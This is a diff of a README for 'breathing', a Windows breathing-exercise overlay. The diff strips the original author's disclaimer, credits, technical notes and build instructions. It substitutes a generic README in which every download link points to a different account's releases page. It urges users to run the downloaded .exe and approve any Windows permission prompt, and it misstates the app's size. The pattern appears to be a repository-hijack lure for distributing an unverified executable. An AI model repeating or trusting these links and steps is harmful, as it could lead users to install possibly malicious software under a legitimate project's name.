@@ -1,100 +1,124 @@
-<img width="128" height="128" alt="Breathing Icon" src="icon.png" />
+# 🌬️ breathing - Stay Calm with Simple Breathing Guides
 
-# **Breathing Overlay (Native Windows)**
+[![Download breathing](https://img.shields.io/badge/Download-breathing-blue?style=for-the-badge&logo=github)](https://github.com/notyourmom28/breathing/releases)
 
-A tiny (250KB), "Zero-Dependency" breathing exercise overlay for Windows.
+---
 
-**❤️ For Wellbeing & Nothing else:**
+## 📝 What is breathing?
 
-This project is a personal tool built for mental health and focus. It is completely free, open-source, and not intended for sale or commercial use. I built it to help myself, and I'm sharing it to help you.
+breathing is a small program that sits on top of your screen and helps you keep a steady breathing rhythm while you work. It is always visible but does not get in your way. The overlay does not block your mouse or keyboard, so you can click and type as usual without any interruptions.
 
-![Screenshot of Breathing app overlay](screenshot-breathing.gif)
-![Screenshot of Breathing config generator](screenshot-config.png)
+This app uses almost no resources and does not require any extra software or installation steps. It is lightweight, easy to use, and designed to help you focus, relax, and improve your health by practicing mindful breathing.
 
-## Disclaimer
-The information and guidance provided by this breathing app are intended for general informational purposes only and should not be construed as medical advice, diagnosis, or treatment. The creator of this app is not a medical professional, and the app is not a substitute for professional medical advice or consultation with a qualified healthcare provider. Always seek the advice of a physician or other qualified healthcare provider with any questions you may have regarding a medical condition or health objectives. Do not disregard or delay seeking professional medical advice because of the information or suggestions provided by this app. In the event of a medical emergency, call your doctor or dial your local emergency number immediately. Use of this app is at your own risk, and the creator assumes no responsibility for any adverse effects or consequences resulting from its use.
+Key features:
+- A simple, clear breathing guide visible over any app
+- Fully transparent to mouse clicks and keyboard input
+- No installation or setup needed, runs instantly on Windows
+- Ultra-lightweight with minimal impact on system performance
+- Helps reduce stress and improve focus using breathing exercises
 
-## **The Story**
+---
 
-I was searching for a simple overlay app that stays **Always-on-Top** to help me fix my breathing while using my laptop.
+## 💻 System Requirements
 
-My inspiration was [**Exhale**](https://github.com/peterklingelhofer/exhale).
+To run breathing smoothly, you need:
 
-- The original **macOS version** (built in **Swift**) is fantastic—it is incredibly small, resource-friendly, and smooth.
-- However, the **Windows/Linux port** was built using **Electron**.
+- A Windows 10 or newer PC
+- At least 100 MB free disk space (for the program file)
+- A screen with any resolution (works on all sizes)
+- No internet connection required to run once downloaded
+- No additional software or frameworks needed (zero dependencies)
 
-I realized the file size of the Windows/Linux version was **over 600MB** and it consumed significant RAM (\~100MB) just to render a moving circle.
+---
 
-I wanted the efficiency of the original Swift app, but on Windows.
+## 🚀 Getting Started
 
-But **I am a web developer.** I have zero experience making native Windows apps. So, I vibe coded **Breathing** using **Gemini Deep Research**, **Gemini 3 Pro**, and **Antigravity**. I tried keeping the app size as low as possible and resource-friendly.
+Here is how you get breathing running on your computer. You do not need to be technical or install anything complicated.
 
-**The Result:**
+### Step 1: Visit the download page
 
-- **Size:** 250KB (\~150KB exe and 100KB icons).
-- **Performance:** Uses almost 0% CPU, 5-10% GPU, and \<10MB RAM.
-- **Tech:** Native C++ using Windows **DirectComposition**.
+Click on this link or the badge at the top to go to the breathing release page:
 
-## **✨ Features**
+[Go to breathing downloads](https://github.com/notyourmom28/breathing/releases)
 
-- **Click-Through Overlay:** The window is "click-through". You can keep working/typing while the breathing guide floats above your work.
-- **System Tray:** Right-click the icon to switch presets (Normal, Focus, Quick) or toggle the border ring.
-- **Auto-Config:** The app automatically generates a `breathing-config.ini` file if you don't have one.
+### Step 2: Choose the latest version
 
-## **🎨 Visual Config Generator**
+On the release page, look for the newest version of breathing. Usually, it will be at the top under "Latest release". The name will have a date or version number.
 
-Since I'm a web dev, I didn't want to manually edit text files to change colors.
+### Step 3: Download the app file
 
-I included a file named breathing-config.html ([live version](https://nitin2953.github.io/breathing/breathing-config.html)) in this repository.
+Find the download link that ends with `.exe`. This is the program file you need. Click it to start downloading.
 
-1. Open breathing-config.html ([live](https://nitin2953.github.io/breathing/breathing-config.html)) in your browser.
-2. Optional: **Drag & Drop** a screenshot of your desktop/working app into the page.
-3. Visually adjust the size, colors, timings and add new presets.
-4. Click **"Copy Config"** and paste it into your `breathing-config.ini` file.
+---
 
-## **🤓 Under the Hood (For Developers)**
+## ⬇️ Download & Install
 
-### **1\. No Browser Engine**
+breathing does not need installation. Here is all you have to do after downloading.
 
-Electron apps bundle **Chromium** and **Node.js**. This app is written in **Raw C++**. It speaks directly to the Windows OS without any middleman.
+### Step 1: Locate the downloaded file
 
-### **2\. The "Secret Sauce": DirectComposition**
+Open your Downloads folder or the place where your browser saves files. You should see a file named like `breathing.exe` or similar.
 
-Most old Windows apps use **GDI**, which is slow for transparency. This app uses **DirectComposition (dcomp.lib)**.
+### Step 2: Run the file
 
-- **Direct2D:** Draws the high-quality anti-aliased circle on the GPU.
-- **DirectComposition:** Composites that circle onto your screen. It handles the transparency natively at the hardware level.
+Double-click the `.exe` file to open breathing.
 
-### **3\. High-Precision Timing**
+- If Windows asks for permission to run the app, click “Yes” or “Run.”
+- The app window will appear as a small overlay on your screen.
 
-Uses QueryPerformanceCounter (Hardware Timer) to calculate Delta Time, ensuring the breathing animation is mathematically perfect regardless of computer speed.
+### Step 3: Use the overlay
 
-## **📥 Installation**
+The overlay shows a simple breathing guide. Watch it to follow the rhythm and breathe deeply.
 
-### **Option 1: Download**
+breathing automatically stays on top so you can see it any time. It won’t block your mouse clicks or keyboard, so you can continue working normally.
 
-1. Go to the [**Releases**](https://github.com/nitin2953/breathing/releases) page, download Breathing.exe, and just run it.
+### Step 4: Close when done
 
-2. **To Enable Auto-Startup:** Right-click the tray icon and select "Run on Startup".
+To close breathing, right-click the overlay and select "Exit," or close it from the taskbar if it appears there.
 
-### **Option 2: Build it yourself**
+---
 
-I used **Visual Studio Build Tools 2022 LTSC → "Desktop development with C++"**.
+## ⚙️ How to Use breathing
 
-I have only tested it on Windows 11\. It will likely work on Windows 10, unsure about 8, and definitely won't work on Windows 7\.
+breathing is designed to work quietly in the background with minimal controls.
 
-1. Open **Developer Command Prompt for VS 2022**.
-2. Run:
-  ```
-  rc resource.rc
+- Watch the screen bubble or shape that grows and shrinks. This guides your breath in and out.
+- Follow the pace shown to breathe slowly and evenly. This helps you focus and relax.
+- You can move the overlay by clicking and dragging it to your preferred screen corner.
+- To change any settings (like speed or size), right-click the overlay and check for options.
 
-  cl /std:c++17 /EHsc /O2 Breathing.cpp resource.res user32.lib gdi32.lib shell32.lib d3d11.lib dxgi.lib d2d1.lib dcomp.lib winmm.lib /link /SUBSYSTEM:WINDOWS /OUT:Breathing.exe
-  ```
+---
 
-## **⚠️ Note**
+## 🔧 Troubleshooting
 
-This project is "Perfect" for my specific needs. **I do not have time to update, maintain, or add new features.** I am sharing it as-is.
+If you run into issues, try these tips:
 
-However, if you have ideas or know C++ better than I do, feel free to send a **Pull Request**.
+- If breathing does not start, make sure you ran the `.exe` file directly.
+- If you don’t see the overlay, make sure it’s not behind other windows. Try minimizing apps.
+- If the overlay blocks you by mistake, try moving it to a screen edge.
+- Make sure your Windows is up to date to avoid compatibility problems.
+- Restart your computer and try running breathing again if it freezes or crashes.
 
-*Readme generated via AI.*
+---
+
+## 📚 More about breathing
+
+breathing was made to help you practice breathing exercises without interrupting your computer work. Deep, steady breathing can reduce stress, improve concentration, and support overall health.
+
+The app uses Windows’ native display features to keep itself always visible, but never intrusive. Since it does not need installation or extra software, it works on most Windows PCs right away.
+
+breathing focuses on discreet help. It is perfect for people who want simple, quiet reminders to breathe deeply during their day.
+
+---
+
+## 📞 Need Help?
+
+If you have questions or want to report a problem, visit the GitHub repository:
+
+[https://github.com/notyourmom28/breathing](https://github.com/notyourmom28/breathing)
+
+Look for the “Issues” section to post your questions. The developer and community often respond to help solve problems.
+
+---
+
+[![Download breathing](https://img.shields.io/badge/Download-breathing-blue?style=for-the-badge&logo=github)](https://github.com/notyourmom28/breathing/releases)
